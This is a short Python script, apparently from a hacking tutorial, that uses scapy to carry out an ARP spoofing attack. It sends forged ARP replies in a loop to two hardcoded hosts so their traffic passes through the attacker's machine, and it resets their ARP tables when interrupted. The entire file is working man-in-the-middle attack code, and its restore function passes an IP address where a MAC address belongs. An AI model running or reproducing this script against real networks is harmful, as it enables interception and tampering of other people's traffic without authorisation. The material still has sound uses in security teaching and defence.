#!/usr/bin/env python3

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc 

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
    scapy.send(packet, verbose=False) #verbose=False gets rid of constantly telling user that packet was sent

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=source_ip, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    sent_packets_count = 0
    while True:
        spoof("10.0.0.1", "10.0.1.1")
        spoof("10.0.1.1", "10.0.0.1")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C Input... Resetting ARP tables... Please wait.\n")
    restore("10.0.0.1", "10.0.1.1")